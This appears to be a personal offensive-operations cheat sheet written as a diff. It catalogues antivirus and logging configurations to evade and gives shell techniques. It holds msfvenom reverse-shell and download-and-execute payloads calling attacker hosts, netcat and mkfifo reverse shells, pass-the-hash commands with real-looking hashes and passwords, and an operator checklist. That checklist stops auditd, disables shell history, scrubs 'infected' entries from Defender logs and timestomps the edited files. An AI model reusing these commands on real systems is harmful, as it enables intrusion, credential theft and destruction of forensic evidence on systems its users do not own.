+		- c:\program files (x86)\Baidu Security\Baidu Antivirus\config.ini 	#AvUpdateDate (epoch)
+	> Last Scan Time: Mon, 13 Apr, 2015 12:01 pm
+		- c:\users\all users\baidu\Antivirus\userconfig.ini					#LastScanTime (epoch)
+	> Next Scheduled Update:
+		$ schtasks /query 
+	> Local/Remote Logging:
+		- Default Local logs locaton 
+			-  c:\program files (x86)\Baidu Security\Baidu Antivirus\log\*.log
+		- c:\program files (x86)\Baidu Security\Baidu Antivirus\config.ini	#UploadServerURL
+		- c:\program files (x86)\Baidu Security\Baidu Antivirus\config.ini	#CloudQueryURL
+	> Mothership:
+		- c:\program files (x86)\Baidu Security\Baidu Antivirus\config.ini	#AutoUpload [EngineOption] (0=off)
+	> Quarantine:
+		- c:\program files (x86)\Baidu Security\Baidu Antivirus\qv
+	> Binaries:
+		- BavSvc.exe (c:\program files (x86)\Baidu Security\Baidu Antivirus\BavSvc.exe)
+		- BHipsSvc.exe (c:\program files (x86)\Baidu Security\Baidu Antivirus\BHipsSvc.exe)
+		- bavhm.exe (c:\program files (x86)\Baidu Security\Baidu Antivirus\bavhm.exe)
+		- BavTray.exe (c:\program files (x86)\Baidu Security\Baidu Antivirus\BavTray.exe) 
+	> Capabilities:
+		- Based on internet research from the vendor, the product has the following capabilities:
+		- Reference
+		- Multiple AV engines
+		- Real Time detection
+		- Web page protection
+		- USB protection
+		- Cloud based defense 
+
+}}} #
+{{{ #chkrootkit
+	> Config Files: Dpkg checks 
+		- /etc/chkrootkit.conf
+	> Persistence:
+		- /etc/chkrootkit.conf	#$RUNDAILY
+		- cron
+	> Loggging:
+		- 
+
+}}} #
+{{{ #ClamAV (Nix)
+	> Assosiated Files:
+		$ apt list --installed | grep clam
+		$ dpkg-query -L clamav
+	> Config Files:
+		- /etc/clamav
+			- clamd.conf 		#AV
+				> LogFile: LogFile
+			- freshclam.conf 	#Updates
+				> UpdateLogFile: 
+				> Checks: Determine how many times in 24 hours, the product checks for updates
+	> Persistence:
+		- x2 in init.d or 2 services
+		- Cron for custom scans
+	> Logs:
+		- /var/log/clamav/
+		- /etc/logrotate.d/ 	#Log Rotation
+	> Latest Signature Version: E11M2
+		- freshclam log files 
+	> Latest Daily Definitions Version: 23898
+		$ grep -Rin daily.cvd /var/log/clamav/freshclam.log*
+		$ clamscan -V
+	
+}}} #
+{{{ #ClamWin
+
+}}} #
+{{{ #Fail2Ban
+	> Config Files:
+		- dpkg 
+		- /etc/fail2ban/jail.conf 
+			> maxretry: Login Tries						#Default=3
+			> findtime: Time allowed between attempts	#Default=600 seconds
+			- SSH specific configs overide other configs  #Check lines around 135
+			- #attack responce
+	> Logging:
+		- /var/log/fail2ban.log
+
+}}} #
+{{{ #KingSoft
+
+
+}}} #
+{{{ #logcheck
+	> Configuration Files:
+		- dpkg
+		- /etc/logcheck 
+		- /etc/logcheck/ignore.d.* 			#logevents per level
+		- /etc/logcheck/logcheck.logfiles	#What logfiles to query
+		> Report Level: Default=Server
+	> Persistence:
+		- cron
+
+}}} #
+{{{ #McAfee
+	> Version: 10.6.0
+	> Activity Logs:
+		-  c:\ProgramData\McAfee\Endpoint Security\Logs 
+
+}}} #
+{{{ #Panda AV
+
+}}} #
+{{{ #rkhunter
+	> Config Files: Dpkg checks 
+		- /etc/rkhunter.conf	#Logging info Lines Around 255-267
+		- /etc/default/rkhunter
+	> Persistence:
+		- cron
+	> Loggging:
+		- /var/log/rkhunter.log file	#Determined by the conf files 
+
+}}} #
+{{{ #SeLinux
+
+}}} #
+{{{ #Sophos
+	{{{ #Nix
+		> Name:
+			- /opt/sophos-av/doc/README
+		> Binaries:
+			- savd
+			- savscand
+		> Config Files: 
+			- savd.cfg
+		> Product/Software Version: 9.14.0.3692.178
+			- /opt/sophos-av/etc/update.last_product_details
+		> Last Signature Installed:
+		> How often does product update:
+			- Check syslog 
+		> Capabilities:
+			- On access and on demand scanning
+		> Next/LastScan:
+			- Check Syslog
+		> Scan Scheduler:
+		> RealTimeProtection:
+			- Yes (verify with savd.log)
+		> Where does the product Log?:
+			- Locally by default
+		> MotherShip:
+			- Potentially...
+	
+	}}} #
+	{{{ #Windows
+		> AV Version: 10.7.6.117
+			- c:\windows\temp\Sophos Anti-virus Major Install Log_...txt
+			- c:\programdata\sophos\autoupdate\data\status\SophosUpdateStatus.xml
+		> Engine: 3.70.2
+			- c:\programdata\sophos\sophos anti-virus\logs\SAV.txt
+			- c:\programdata\sophos\autoupdate\data\status\SophosUpdateStatus.xml
+		> Latest Signature: 2018-05-10
+			- c:\programdata\sophos\autoupdate\data\warehouse	#Newest Files
+		> Last Scan: 2018-05-09 13:11:24
+			- HKLM\Software\SophosHomeClean\LastScan
+			- c:\programdata\sophos\home clean\logs\SophosHomeClean...log
+		> Next Scan:
+			- No scheduled scan option 
+			- check schtasks?
+		> Remote/Local Logging: Both
+			- dir c:\*sdu*.xml /s
+		> Mothership:
+			- c:\programdata\sophos\sophos anti-virus\logs\SAV.txt	#Sophos Live Protection
+		> Quarantine Folder: (Sophos does not have a quarantine folder)
+			- dir c:\*quara* /s /ad
+			- type "C:\users\all users\sophos\sophos anti-virus\config\quarantine.xml
+		> Capabilities:
+			- Based on internet research from the vendor, the product has the following capabilities:
+			- Real Time AV Protection
+			- Parental Web Filtering
+			- Web Site Blacklisting
+			- Remote Management
+			- Advanced Real-Time Protection
+			- Ransomware Protection
+			- Advanced Web Protection
+			- Banking Protection
+			- Privacy Protection
+			- Advanced Malware Removal
+			- Multiple Device Protection 
+		> Binaries:
+			- hmpalert.exe (c:\program files (x86)\HitmanPro.Alert\hmpalert.exe) This program may or may not be running.
+			- SavService.exe (c:\program files (x86)\Sophos\Sophos Anti-Virus\SavService.exe)
+			- ALMon.exe (c:\program files (x86)\Sophos\AutoUpdate\ALMon.exe)
+			- SAVAdminService.exe (c:\program files (x86)\Sophos\Sophos Anti-Virus\SAVAdminService.exe)
+			- swi_service.exe (c:\program files (x86)\Sophos\Sophos Anti-Virus\Web Intelligence\swi_service.exe)
+			- SntpService.exe (c:\program files\Sophos\Sophos Network Threat Protection\bin\SntpService.exe)
+			- ALsvc.exe (c:\program files (x86)\Sophos\AutoUpdate\ALsvc.exe)
+			- McsAgent.exe (c:\program files (x86)\Sophos\Management Communications System\Endpoint\McsAgent.exe)
+			- McsClient.exe (c:\program files (x86)\Sophos\Management Communications System\Endpoint\McsClient.exe)
+			- swc_service.exe (c:\program files (x86)\Sophos\Sophos Anti-Virus\Web Control\swc_service.exe)
+			- SDRservice.exe (c:\program files\Sophos\Sophos Data Recorder\SDRservice.exe)
+			- ssp.exe (c:\program files\Sophos\Sophos System Protection\ssp.exe)
+	}}} #
+		
+}}} #
+{{{ #SolarWinds Event Forwarder
+	- Get logs being forwarded 
+		- LogForwarderSettings.cfg
+			- <strings>: inside of <sources>:
+
+}}} 
+{{{ #Spyware/Adware Removal Tool
+
+}}} #
+{{{ #Symantec
+
+}}} #
+{{{ #Windows Built-Ins
+	- Device Guard					
+		$ reg query  HKLM\SYSTEM\currentcontrolset\control\deviceguard	
+			if ( EnableVirtualizationBasedSecurity == 0 & RequirePlatformSecurityFeatures == 0)
+				DeviceGuard == Disabled
+	- Credential Guard 
+		$ reg query HKLM\SYSTEM\currentcontrolset\control\LSA
+			if ( LsaCfgFlags == 0 )
+				CredentialGuard == Disabled 
+	- BitLocker
+		$ manage-bde -status	#Read the Output
+	- Trusted Platform Module 
+		$ wmic /namespace:\\root\cimv2\security\microsofttpm path win32_tpm get * /format:textvaluelist.xsl
+	- MeasuredBoot
+		- If either BitLocker or TPM are off, so is MeasuredBoot
+	- WhiteListing
+		$ reg query "HKLM\software\policies\microsoft\windows\safer\codeidentifiers"
+	- Applocker
+		$ sc query AppIDSvc
+		$ reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\
+
+}}} #
+{{{ #Windows Defender/Microsoft Security Essentials
+	{{{ #What Technology Is Being Used?
+		- Newest quarantine file
+			$ dir c:\*Quarantine* /s
+			- The newest Dir is the one!
+		- Product Name 
+			$ reg query "HKLM\software\microsoft\Microsoft Security Client\ProductName"
+			$ wmic /node:localhost /namespace:\\root\SecurityCenter2 path AntiVirusProduct get * /value
+		- Locations
+			$ reg query "HKLM\software\microsoft\Windows Defender"
+			- C:\program files\Windows defender\MSASCuiL.exe,MpCmdRun.exe,MsMpEng.exe,NisSrv.exe
+			$ reg query "HKLM\Software\Microsoft\microsoft\Microsoft antimalware\
+			- "c:\users\all users\microsoft\microsoft antimalware\quarantine"
+		- Notes
+			- https://en.wikipedia.org/wiki/Microsoft_Defender
+			
+	}}} #
+	{{{ #Current Versions/Signatures/Updates
+		- Date Conversion
+			- Get Value from reg key 
+			- convert to Big Endian 	# ABCDEF == EFCDAB
+			- Left==UTC Right==Localtime
+			$ run multicommand -cl 'cmd.exe /c w32tm.exe /ntte 0x<VALUE>'
+		- MSE
+			> AV Engine:
+				- MpSigStub.log #Engine 
+				$ reg query "HKLM\Software\Microsoft\Microsoft antimalware\signature updates\EngineVersion"
+			> NIS Engine: (Network Inspection Engine)
+				- MpSigStub.log
+				$ reg query "HKLM\software\microsoft\ microsoft antimalware\signature updates\NISEngineVersion"
+			> AV Signature Version: 
+				$ reg query " HKLM\software\microsoft\microsoft antimalware\signature updates\AVSignatureVersion"
+			> Latest Signature Install/Update:
+				- MpSigStub.log
+				$ wevtutil qe system /q:"*[System/EventID=2000]" /C:10 /rd:true
+				$ reg query "HKLM\Software\Microsoft\Windows Defender\Signature Updates"
+		- Not sure
+			- MPLog.log		
+		
+	}}} #
+	{{{ #Log Cleaning
+		- Windows Defender 
+			$ type MpCmdRun.log | findstr infected
+			- Download File 
+			$ wc -l MpCmdRun.log
+			$ iconv -f UTF-16 -t UTF-8 MpCmdRun.log | grep -v "infected" > newlog.log
+			$ wc -l newlog.log
+			$ dir MpCmdRun.log 	#For OGFile Time 
+			$ upload /tmp/newlog.log MpCmdRun.log 
+			$ timestomp -m "04/24/2018 10:37:53" MpCmdRun.log
+			$ ls MpCmdRun.log	#Verify Time
+
+	}}} #
+	{{{ #Logging
+		- Current Log Locations
+			$ handle.exe -p 3232 -a /AcceptEULA | findstr -r "File" | findstr -r ".*log$"	#Pid=MsMpEng.exe
+		- Logging TO Remote
+			$ netsh advfirewall firewall show rule status=enabled name="all" direction=out	#Look through output for 5985
+			$ dir /t:w "c:\windows\system32\winevt\logs\ForwardedEvents.evtx"				#Recenlty Written=Collector (If not it could be a forwarder)
+		- Remote Logging FROM (Log Collector) 
+			> WEC: (Windows Event Collector)
+			> WinRM: (Windows Remote Managment)
+			- Queries
+				$ netsh advfirewall firewall show rule status=enabled name="all" direction=in		#Look through output for 5985
+				$ sc query winrm
+				$ sc query wecsvc
+				$ winrm get winrm/config | findstr 	"RemoteShellAccess"								#True 					Inidcates it could be logged to
+				$ winrm enumerate winrm/config/listener												#Enabled=True 			Inidecates it could be logged to 
+				$ netsh advfirewall firewall show rule name="Windows Remote Management (HTTP-In)"	#Rule Existing/Enabled	Inidecates it could be logged to
+				$ dir /t:w "c:\windows\system32\winevt\logs\ForwardedEvents.evtx"					#Recenlty Written=Collector (If not it could be a forwarder)
+			
+	}}} #
+	{{{ #MotherShip (SpyNetReporting)
+		- Can files be sent to "MotherShip"
+			- MSE 
+				$ reg query "HKLM\SOFTWARE\Microsoft\Microsoft antimalware\Spynet"	#spynetreporting	#TODO:Verify
+			- Windows Defender
+				$ reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Spynet"	#spynetreporting
+			- Values
+				- 0 = off
+				- 1 = Basic
+				- 2 = Advanced
+				- https://admx.help/?Category=Windows_7_2008R2&Policy=Microsoft.Policies.WindowsDefender::SpyNetReporting	
+	
+	}}} #
+	{{{ #Quarantine
+		- Where is the quarantine folder?
+			$ dir c:\*quarant* /s 
+			- c:\users\all users\microsoft\microsoft antimalware\quarantine
+		- Most Recent capture
+			$ dir "c:\users\all users\microsoft\microsoft antimalware\quarantine"
+			$ wevtutil qe system /q:"*[System/EventID=1011]" /C:10 /rd:true
+		
+	}}} #
+	{{{ #Scans
+		- Last Successful Scan:
+			$ wevtutil qe security /q:"*[System/EventID=1000]" /C:10 /rd:true	#Scan Start #TODO:Verify
+			$ wevtutil qe security /q:"*[System/EventID=1001]" /C:10 /rd:true	#Scan Finish #TODO:Verify
+		- Excluded from scans 
+			$ reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions"				#Paths, Processes, Extensions
+			$ reg query "HKEY_LOCAL_MACHINE\Software\Microsoft\Microsoft Antimalware\Exclusions\Paths"	
+		- Last successful scheduled scan
+			$ download MpCmdRun.log /tmp 
+				$ vi MpCmdRun | grep "Starting RunCommandScan"
+		- When Is the next Scheduled Scan?
+			$ schtasks /query | findstr -i "defender"
+
+	}}} #
+
+}}} #
+{{{ #Zone Alarms Firewall
+
+
+}}} #
+
+}}} ###
+{{{ ###Shells
+{{{ #evil-winrm
+	$ ruby evil-winrm.rb -i 10.10.10.169 -u melanie -p 'Welcome123!' 
+
+}}} #
+{{{ #msfvenom
+	- Downloads and Executes file from url (http or ftp).
+		$ msfvenom -p windows/download_exec URL=http://yee.wtf/yeet.exe -f exe -o dandy.exe
+	- Examples 
+		$ msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.60 LPORT=3232 -f raw -o PhpShell.php
+		$ msfvenom -p windows/shell_reverse_tcp lhost=10.11.0.186 lport=443 -f asp -a x86 --platform win 
+		$ msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.60 lport=3234 -f aspx -a x86 --platform win  
+		$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.11.0.186 LPORT=443 -f raw 
+		$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.60 lport=3235 -f exe --platform windows -a x86 -o 3235.exe -e x86/shikata_ga_nai -i 18
+		$ msfvenom -p windows/shell_reverse_tcp lhost=192.168.11.21 lport=443 -f vba 
+		$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.119.167 LPORT=443 -f war  
+		$ msfvenom --list payloads
+	- Make an exe from a template: "very cool" "Shell7er like"
+		$ msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe -x /root/calc.exe LHOST=ens192 LPORT=443 -o badcalc.exe
+	- Run Command 
+		$ msfvenom -p windows/exec CMD="net user squid 12qwaszx!@QWASZX /add" -f exe -o yeet.exe
+		$ msfvenom -p windows/exec CMD='net localgroup administrators bill /add' -f exe -o Advanced.exe
+
+}}} #
+{{{ #nc
+	- Generic Syntax 
+		$ nc -nlvp 3232
+		$ C:\users\mssql-svc\Desktop\nc.exe 10.10.14.8 3232 -e cmd.exe
+	- Ubuntu syntax (goofy nc binary)
+		- Listen
+			$ nc -nlvp 3232
+		- fifo for bind 
+			$ rm -f /tmp/f; mkfifo /tmp/f && cat /tmp/f | /bin/bash -i 2>&1 | nc 192.168.119.132 80 > /tmp/f
+		- fifo for reverse 
+			$ rm -f /tmp/f; mkfifo /tmp/f && cat /tmp/f | /usr/bin/nc -l 32323 | bash > /tmp/f 
+
+}}} #
+{{{ #PowerShell
+	- Remote into another macihne
+		$ Enter-PSSession -ComputerName 192.168.11.11 -ConfigurationName permgen -Credential (Get-Credential)
+		- Enter Remote PSSession
+			```O
+			$ $session7 = New-PSSession -computername win7 -credential win7\administrator
+			$ Enter-PSSession -session $session7
+			$ Exit-PSSession
+			```C
+
+}}} #
+{{{ #PsExec
+	- NOTES:
+		-accpeteula is often a big deal.
+	- Basic usage
+		$ psexec \\remote-computer -u domain\username -p password -accepteula command to be executed
+		$$ psexec \\xp.ops.local -u xp\administrator -p L33tHax0r -accepteula ipconfig /all
+	- Start system account 
+		$ psexec -s cmd.exe
+	- start service account 
+		$ .\PSExec64.exe -i -u "nt authority\local service" cmd.exe
+	- get user sid
+		$ psgetsid bob
+		
+}}} #
+{{{ #psexec.py
+	$ psexec.py htb/administrator:PASSWORD@10.10.10.161  
+	$ psexec.py htb/administrator@10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 -dc-ip 10.10.10.161  
+	- if psexec.py fails, try smbexec.py and wmiexec.py (syntax is identical)  
+
+}}} #
+{{{ #smbclient
+	$ smbclient -h '\\10.10.10.169\sysvol' -U melanie -W megabank.local -I 10.10.10.169  
+
+}}} #
+{{{ #smbmap
+	$ smbmap -u prtgadmin -p PrTg@dmin2019 -d netmon -H 10.10.10.125 -x whoami 
+
+}}} #
+{{{ #ssh 
+	{{{ #Authentication Techniques			
+		{{{ #CA and CA.pub
+			- signed priv key with a "public key cert" and "public key" in the same dir
+				- Sign in with a password 	(pulic key auth)
+				- Private key 				(other side of public key auth) 
+				- Signed private key with a "public key cert" and "public key" in the same dir.
+				- https://www.hackingarticles.in/hack-the-box-ypuffy-walkthrough
+
+		}}} #
+		{{{ #KeyPair Authentication (Client Public Key written to Server authorized_keys)
+			- On Client 
+				$ mkdir .ssh   
+				$ ssh-keygen -t rsa 
+					$ enter, enter, enter  
+				$ ssh-copy-id -i id_rsa.pub squid@1.1.1.1		#Puts the public key file in /home/squid/.ssh/authorized_keys
+				$ ssh squid@1.1.1.1 							#No password needed
+
+			- Permissions for functionality 
+				> .ssh: 0700
+				> authorized_keys: 0640
+				> id_rsa: 0400
+				
+			- https://www.linode.com/docs/guides/use-public-key-authentication-with-ssh/
+
+		}}} #
+		{{{ #Password
+			- Use your keyboard
+
+		}}} #
+		{{{ #Servers Private Key
+			$ ssh -i servers_rsa.priv root@1.1.1.1
+			
+		}}} #
+		
+	}}} #
+	{{{ #Common Troubleshooting
+		{{{ #Client and server could not agree on a key exchange algorithm
+			$ ssh -oKexAlgorithms=+diffie-hellman-group14-sha1 alice@10.11.1.141
+		
+		}}} #
+		{{{ #Install OpenSSH on Windows 
+			- https://github.com/PowerShell/Win32-OpenSSH/wiki/Install-Win32-OpenSSH#install-win32-openssh-test-release
+		
+		}}} #
+		{{{ #Root can't login 
+			$ vim /etc/ssh/sshd_config 
+				```O
+				PasswordAuthentication yes 
+				PermitRootLogin yes
+				```C
+			- restart ssh service 
+
+		}}} #
+		
+	}}} #
+	
+}}} #
+{{{ #telnet
+	- Wireshark to sniff telnet creds 
+		$ tcp.port == 23 and ip.addr != myip
+
+}}} #
+{{{ #winexe/pth-winexe
+	$ winexe -U jenkins/administrator%S1TjAtJHKsugh9oC4VZl //10.10.10.63 cmd.exe  
+	$ winexe -U jenkins/administrator //10.10.10.63 cmd.exe will prompt you for creds 
+	$ pth-winexe -U jenkins/administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 //10.10.10.63 cmd.exe  
+	$ pth-winexe -U jenkins/administrator //10.10.10.63 cmd.exe will prompt you for creds
+
+}}} #
+
+}}} ###
+{{{ ###FAQ
+	- Get enabled virtual web hosts
+		$ grep -rin "<" /etc/apache2/sites-enabled 	#Look for listening port numbers
+	-  Get allowed ports
+		$ netsh advfirewall show currentprofile 	#State, And Firewall Policy (allowed and blocked)
+		$ netsh advfirewall firewall show rule name=all
+		
+	
+
+}}} ###
+
+{{{ ###CNOQC Operating
+	{{{ #Beg Operating
+		- Read ALL the words
+		- Change Downloaded Filenames To something smaller (Ergonomics)
+		- Enable Kali ssh 
+			$ service ssh stop && sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config && service sshd start && service sshd status
+		- WinScp to kali 
+			- Move Resource Scripts
+		- Set Up Terminals 
+		- Drop DG
+			$ cd /tmp
+			$ ip route del default 
+			$ ip route add 192.0.2.80/32 via 192.168.11.254
+		$ msfconsole -an 
+		- OPPlan To Notepad++
+		- Full OPPLan outside of Opstaion (Ergonmics)
+		- Running Tunnel Syntax Build Init 
+			$ ssh -M -S /tmp/t32051 -p 32051 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null bob@127.0.0.1 # scp -o ControlPath=/tmp/t32051 dum@127.0.0.1: /tmp   
+		- Read ALL the words
+		- Annotate Special Rules
+		- Operate
+		
+	}}} #
+	{{{ #Between Boxes
+		- Did I do all the things?
+		- Recheck ALL Questions
+		- How Do I get to the next box with the least amount of logging?
+
+	}}} #
+	{{{ #Before Exit
+		- Did I do all the things?
+		- Do I have leftover files?
+		- Will I have hanging processes?
+
+	}}} #
+	{{{ #Nix Operating
+		{{{ #FAQ
+			{{{ #Executable Common Locations
+			- Most Common v
+				- /bin, /sbin, /usr/bin, /usr/sbin 
+				- /usr/local/bin, /user/local/sbin 
+				- /opt, /usr/share, /usr/lib
+				---
+				- /media, /mnt, /boot
+				- /tmp, /var, /home 
+			- Least Common ^
+
+			}}} #
+				- Parse filesystem for string 
+					$ find / \( -path /proc -prune -o -path /sys -prune -o -path /dev -prune -o -path /run -prune \) -o -type f -exec grep -H "os.geteuid" \{\} \;
+					$ find / -xdev -newermt "2022-02-02 14:30" -type f -exec grep -H "string" {} +
+				- Get processes Utilizing Ports Accessable from Remote Machines
+					$ netstat -natup | awk 'NR!=1 && NR!=2 && $4!~/^::1:|^127./{print $0}'
+				- Get cat output with Filename 
+					$ tail -n +1 /etc/init/*.conf 
+				- Get System Boot Time 
+					$ who -a
+				- Get Kernel Architecture 
+					$ getconf LONG_BIT
+					$ uname -im 
+				- Get cpu Architecture Capability 
+					$ grep flags /proc/cpuinfo | egrep --color='auto' "lm|tm|rm"	#lm:64 tm:32 rm:16
+				- Get files created while on box 
+					$ yeetDirs=$(find /home /root /tmp /var/log -type f)
+					$ comm -23 <(echo "`find /home /root /tmp /var/log -type f `") <(echo "$yeetDirs") 2> /dev/null
+				
+				
+		}}} #
+		{{{ #Clump
+		```O
+		#SA
+		touch /dev/start && date && date +%s
+		find / -not -path "/proc/*" -not -path "/sys/*" -type f -mmin 20
+		unset HISTFILE 
+		whoami && id && ip a | grep "inet " && man -f init && lsb_release -a && uname -a && w
+		echo $$ && ps -elfH && netstat -natup 
+		service auditd stop && service auditd status && ls -lah `egrep "^log_file" /etc/audit/auditd.conf | awk -F "=" '{print $2}'`
+
+		#SecPro
+		sestatus
+
+		#Logging SA
+		tail -n +1 `ls -lahfr /etc/*syslog* /etc/audit/audit* /etc/journal* | xargs`
+
+		#Users SA 
+		for acc in `getent passwd | egrep ".*sh$" | cut -d ':' -f1`;do getent shadow $acc;done | awk -F ":" '$2!~/^\*|^!|^$/{print $0}'
+		getent passwd
+		getent shadow 
+		getent group 
+		env && locale
+		last
+		for user in $(cut -f1 -d: /etc/passwd);do sudo -l -U $user; done
+		find /home /root /export -type f -name "*history" -size +0 2>/dev/null
+		find /home /root /export -type f -name "*history" | xargs | egrep "ssh|telnet|rlogin|su|su"
+		find /root /home /export -name ".*" | awk -F "/" '{print $NF}' | sort | uniq -c
+		cat -n `getent passwd root | awk -F ':' '{print $6}'`/.*history 
+
+		#Networking SA 
+		hostname -f || hostname 
+		ip a
+		cat /etc/resolve.conf 
+		netstat -rn 
+		netstat -natup 
+
+		#Firewalls SA
+		ogtables = `lsmod  | grep iptable`
+		echo "$ogtables"
+		iptables -nvL --line-numbers
+
+		#Physical SA
+		lsmod 
+		free
+		cat /proc/cpuinfo
+		uptime  
+		df -Th
+		mount
+		fdisk -l
+		cat /etc/fstab
+		apt list --installed
+		yum list installed
+		rpm –qa ––last
+
+		#Init  
+		man -f init
+		systemctl get-default 
+		cat /etc/inittab | grep initdefault
+		cat /etc/init/rc-sysinit.conf	| grep DEFAULT_RUNLEVEL
+		cat /etc/inittab | grep ":initdefault"
+		systemctl list-unit-files -t service | grep enabled 
+		chkconfig --list
+		insserv -s 
+		initctl show-config
+		tail -n +1 `find / -name rc.local`
+
+		#Disk Check MT 
+		ls -latr / /home/* /var /tmp /opt /root/ 
+		find /tmp /home /media /mnt /etc -maxdepth 4 -type f -exec file \{\} \; | egrep 'SB| ASCII text executable'	
+		find / -regextype awk -regex ".*/\.\.+.*"
+		ls -lah /etc/xinetd.conf /etc/xinetd.d 
+		chkconfig --list && inetadm | grep enabled 
+		egrep -v "kernel|dbus" /var/log/messages | tail -n 50 
+
+		#Cron MT 
+		cat /etc/crontab /etc/anacrontab /etc/attab
+		cat `ls -latrd /etc/cron* /etc/sysconfig/cron* | awk '$1!~/^d.*/{print $9}' | xargs`
+		ls -latr /var/spool/{cron,at,anacron}/* 2>/dev/null
+		for user in $(cut -f1 -d: /etc/passwd);do crontab -u $user -l; done
+
+		#Init MT 
+		cat /etc/inittab 
+		egrep -Rin "python|bash|ruby|perl" /usr/lib/systemd/system /lib/systemd/system /etc/systemd/system /run/systemd/system | grep -i start 
+		egrep -Rin "python|bash|ruby|perl" /etc/init*
+		find /usr/lib/systemd/system /lib/systemd/system /etc/systemd/system /run/systemd/system -type f -printf "%T@ %Tc %p\n" | sort -n
+		find /etc/init* -type f -printf "%T@ %Tc %p\n" | sort -n | tail -n 10 
+		find /home /root /export -type f -name "*rc" -size +0	
+		find /home /root /export -type f -name "*profile" -size +0
+
+		#EZ-Wins MT 
+		systemctl list-sockets
+		lsof | awk '$10~/.*libpcap.*|.*socketmod.*/{print $0}'
+		lsof | awk '$4~/w/ && $5~/REG/ && $9!~/^.dev|^.proc|^.run/{print $0}'
+		for i in $(ps -eo pid,cmd --no-header | awk '$2!~/^\[.*\]$/{print $1}'); do man -f $(cat /proc/$i/comm);done | grep "nothing appropriate"
+
+		#Fundamentals MT
+		netstat -natup 
+		ps -eo user,pid,ppid,vsz,tty,time,comm,cmd --sort start_time | awk '$4 != "0"'
+
+		#Correct Loaded Modules PD
+		rmmod $(diff <(echo "`lsmod | grep iptable`") <(echo "$ogtable") | egrep "^<" | awk '$2~iptable_.*/{print $2}')
+		diff <(echo "`lsmod | grep iptable`") <(echo "$ogtable")
+
+		#Log Check PD
+		yeetchanged=$(find / -not -path "/proc/*" -not -path "/sys/*" -cnewer /dev/start -type f | xargs
+		grep YEETIP `echo "$yeetchanged"`
+
+		#Log Clean 
+		ls -lah /var/log/yeet.log
+		cp /var/log/yeet.log > /tmp/yeet.clean 
+		Grep -v yeet
+		cp /tmp/yeet.clean /var/log/yeet.log 
+		chown asdf /var/log/yeet.log 
+		chmod /var/log/yeet.log 
+		tail -n 1 /var/log/yeet.log 
+		touch -t YYYYMMDDHHMM.SS /var/log/filename
+
+		#Final PD
+		cd /tmp && echo -e '#!/bin/sh\nsleep 20\nfunction d {\nservice auditd start; rm -rf /tmp/X-unix\n}\ntrap d EXIT' > X-unix && chmod 755 X-unix && cat X-unix && ./X-unix& && exit
+
+		```C	
+
+		}}} #
+		
+		{{{ #My SA 
+unset HISTFILE 
+su -l 
+
+whoami 
+hostname
+ip a
+date && date +%s 
+unset HISTFILE 
+
+find / -not -path "/proc/*" -not -path "/sys/*" -type f -mmin 5 
+
+id 
+echo $$
+ps -elfH 
+netstat -natup 
+man -f init 
+cat /etc/*elease*
+uname -a 
+w 
+
+file `which --skip-alias ls apt dpkg service systemctl netstat ps cat uname w man echo id find date ip service lsof grep egrep awk locale hostname lsmod free uptime who runlevel tail getent file chkconfig rmmod diff mkdir touch comm` | grep -v LSB 
+alias
+
+ogtables=`lsmod | grep iptable`
+echo "$ogtables"
+
+yeetIP=$(netstat -natup | grep `echo $PPID` | awk '{print $5}' | awk -F ":" '{print $(NF-1)}')
+echo "$yeetIP"
+
+egrep -nl "$yeetIP|Successful su for|/bin/su" `find / -not -path "/proc/*" -not -path "/sys/*" -not -path "/run/*" -type f -size +0b -mmin -360 | xargs` | tee >(awk -F ":" '{print $1}' | sort | uniq | xargs)
+
+		}}} #
+		{{{ #Effects 
+			- Perform Effects 
+			- Keep Doing Great 
+		
+		}}} #
+		{{{ #Mando SA 
+cat /etc/*syslog.conf 
+cat /etc/*syslog.d/*
+cat /etc/logrotate.conf 
+cat /etc/logrotate.d/* 
+
+cat /etc/passwd 
+cat /etc/shadow
+cat /etc/group 
+cat /etc/sudoers
+
+cat /root/.bash_history
+cat /home/*/.*history 
+
+cat /home/*/.*history | egrep "ssh|telnet|rlogin|su|sudo"
+
+cat /etc/resolve.conf 
+cat /etc/hosts 
+
+cat /proc/cpuinfo 
+cat /etc/fstab 
+cat /etc/rc.local 
+
+ls -latr /etc 
+
+ls -al /etc/cron.* 
+ls -al /var/spool/cron
+
+grep `echo $yeetIP` /var/log/secure 
+grep `echo $yeetIP` /var/log messages 
+
+locale 
+last
+lsb_release -a 
+hostname 
+ip a 
+netstat -rn 
+iptables -nL 
+lsmod 
+free
+uptime 
+apt list --installed 
+rpm qa || cat /var/log/rpmpkgs 
+who -r || runlevel 
+		
+		}}} #
+		{{{ #Malware Triage 
+#Users 
+for acc in `getent passwd | egrep ".*sh$|.*:$" | cut -d ':' -f1`;do getent shadow $acc;done | awk -F ":" '$2!~/^\*|^!|^$/{print $0}' 			
+		
+#Disk Check MT
+ls -latr /home/* /var /tmp /opt /root/ 
+find /root /home /export -name ".*" | awk -F "/" '{print $NF}' | sort | uniq 
+find /root /home /export -type f -name "*history" -size +0 2>/dev/null 
+find /tmp /home /media /mnt /etc -maxdepth 4 -type f -exec file \{\} \; 2>/dev/null | egrep 'SB|ASCII text executable'
+find / -regextype awk -regex ".*/\.\.+.*"
+ls -lah /etc/xinetd.conf /etc/xinetd.d 
+chkconfig --list && inetadm | grep enabled 
+egrep -v "kernel|dbus" /var/log/messages | tail -n 50
+
+#Cron MT 
+cat /etc/crontab /etc/anacrontab /etc/attab 
+cat `ls -latrd /etc/cron* /etc/sysconfig/cron* | awk '$1~/^d.*/{print $9}' | xargs` 
+ls -latr /var/spool/cron,at,anacron}/* 2>/dev/null 
+for user in $(cut -f1 -d: /etc/passwd);do crontab -u $user -l; done
